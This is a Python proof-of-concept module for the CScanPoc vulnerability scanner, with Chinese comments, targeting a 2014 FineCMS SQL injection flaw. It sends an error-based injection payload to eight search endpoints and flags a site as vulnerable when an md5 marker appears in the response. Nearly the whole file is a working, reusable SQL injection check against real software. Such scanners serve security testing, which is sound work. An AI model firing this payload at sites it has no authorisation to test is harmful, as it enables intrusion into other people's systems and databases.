# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'FineCMS_0002_p'  # 平台漏洞编号，留空
    name = 'FineCMS 设计缺陷导致多处SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-05-12'  # 漏洞公布时间
    desc = '''
        FineCMS设计缺陷导致大面积SQL注入漏洞：
        "/book/index.php?c=search&catid=23",
        "/down/index.php?c=search&catid=23",
        "/fang/index.php?c=search&catid=23",
        "/news/index.php?c=search&catid=23",
        "/photo/index.php?c=search&catid=23",
        "/special/index.hp?c=search&catid=23",
        "/video/index.php?c=search&catid=23",
        "/shop/index.php?c=search&catid=23",
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'FineCMS'  # 漏洞应用名称
    product_version = '*'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0d623210-fab4-4518-a652-53ce79a68885'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            ipos = [
                "/book/index.php?c=search&catid=23",
                "/down/index.php?c=search&catid=23",
                "/fang/index.php?c=search&catid=23",
                "/news/index.php?c=search&catid=23",
                "/photo/index.php?c=search&catid=23",
                "/special/index.hp?c=search&catid=23",
                "/video/index.php?c=search&catid=23",
                "/shop/index.php?c=search&catid=23",
            ]
            payload = '%20and%20(select%201%20from%20(select%20count(*),concat(md5(1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)'
            for i in ipos:
                verify_url = self.target + i + payload
                #code, head, body, errcode, final_url = curl.curl('-L %s' % target);
                r = requests.get(verify_url)

                if 'c4ca4238a0b923820dcc509a6f75849b1' in r.text:
                    # security_hole(verify_url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
